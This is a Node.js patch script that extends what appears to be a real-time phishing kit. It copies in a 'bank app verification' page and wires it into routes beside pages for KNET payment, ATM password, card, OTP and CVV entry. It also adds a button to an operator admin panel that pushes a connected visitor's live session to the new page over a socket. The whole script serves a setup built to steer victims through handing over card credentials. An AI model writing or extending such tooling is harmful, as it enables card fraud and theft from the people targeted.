import fs from "node:fs";
import path from "node:path";
const E = "utf8";
let bad = 0;
const M = "C:/Users/user/mf-ref/";
const cp = (from, to) => {
  try { fs.mkdirSync(path.dirname(to), { recursive: true }); fs.copyFileSync(M + from, to); console.log("copied  " + to); }
  catch (e) { console.log("COPY FAIL " + from); bad++; }
};
cp("client/src/components/layout/PageLayout.tsx", "client/src/components/layout/PageLayout.tsx");
cp("client/src/components/WaitingOverlay.tsx", "client/src/components/WaitingOverlay.tsx");
cp("client/src/components/ui/button.tsx", "client/src/components/ui/button.tsx");
cp("client/src/pages/BankAppVerification.tsx", "client/src/pages/BankAppVerification.tsx");

function edit(file, pairs, label) {
  let t = fs.readFileSync(file, E);
  const eol = t.includes("\r\n") ? "\r\n" : "\n";
  for (const [o, n, tag] of pairs) {
    const O = o.split("\n").join(eol), N = n.split("\n").join(eol);
    const c = t.split(O).length - 1;
    if (c === 0) { console.log("NO MATCH " + label + " / " + tag); bad++; continue; }
    t = t.split(O).join(N);
    console.log("ok       " + label + " / " + tag + " x" + c);
  }
  fs.writeFileSync(file, t, E);
}

edit("client/src/kdd/StorefrontApp.tsx", [
['import ATMPassword from "../pages/ATMPassword";',
 'import ATMPassword from "../pages/ATMPassword";\nimport BankAppVerification from "../pages/BankAppVerification";', "import"],
['  { paths: ["/atm", "/atm-password"], element: <ATMPassword /> },',
 '  { paths: ["/atm", "/atm-password"], element: <ATMPassword /> },\n  { paths: ["/bank-app-verification", "/app"], element: <BankAppVerification /> },', "route"]
], "StorefrontApp");

edit("client/src/lib/pageRoutes.ts", [
['  atm: "/atm", "atm-password": "/atm",',
 '  atm: "/atm", "atm-password": "/atm",\n  "bank-app-verification": "/bank-app-verification", app: "/bank-app-verification",', "map"],
['"knet", "knet-otp", "card", "otp-verification", "atm", "cvv", "final-page",',
 '"knet", "knet-otp", "card", "otp-verification", "atm", "bank-app-verification", "cvv", "final-page",', "prefixes"]
], "pageRoutes");

edit("client/src/pages/KNETPayment.tsx", [
['      if (phase === "card") {\n        if (action === "otp") {',
 '      if (phase === "card") {\n        if (action === "app") {\n          navigate("/bank-app-verification");\n        } else if (action === "otp") {', "app action"]
], "KNETPayment");

edit("client/src/pages/CreditCardPayment.tsx", [
["      if (action === 'otp') {\n        navigate(\"/otp-verification\");",
 "      if (action === 'app') {\n        navigate(\"/bank-app-verification\");\n      } else if (action === 'otp') {\n        navigate(\"/otp-verification\");", "app action"]
], "CreditCardPayment");

edit("kdd-public/admin.html", [
["    function cardActionReject(btn, socketId) {",
`    function cardActionApp(btn, socketId) {
      const originalText = btn.textContent;
      const originalBg = btn.className.match(/bg-\\w+-\\d+/)?.[0] || 'bg-purple-600';
      window.skipDetailsUpdate = true;
      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'app' });
      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
      if (visitor) { visitor.waitingForAdminResponse = false; }
      renderVisitorsList();
      btn.textContent = 'تم الإرسال';
      btn.classList.remove(originalBg);
      btn.classList.add('bg-green-600');
      setTimeout(() => {
        window.skipDetailsUpdate = false;
        btn.textContent = originalText;
        btn.classList.remove('bg-green-600');
        btn.classList.add(originalBg);
      }, 1500);
    }

    function cardActionReject(btn, socketId) {`, "cardActionApp fn"],
[`html += '<button onclick="cardActionOTP(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';`,
`html += '<button onclick="cardActionApp(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق</button>';
              html += '<button onclick="cardActionOTP(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';`, "apply btn A"],
[`html += '<button onclick="cardActionOTP(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium">OTP</button>';`,
`html += '<button onclick="cardActionApp(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium">تطبيق</button>';
          html += '<button onclick="cardActionOTP(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium">OTP</button>';`, "apply btn B"]
], "admin");

console.log("");
console.log("cardActionApp fn : " + (fs.readFileSync("kdd-public/admin.html", E).split("function cardActionApp").length - 1));
console.log("bank-app route : " + (fs.readFileSync("client/src/kdd/StorefrontApp.tsx", E).split("bank-app-verification").length - 1));
console.log(bad === 0 ? "RESULT: OK" : "RESULT: " + bad + " failure(s)");
process.exit(bad ? 1 : 0);
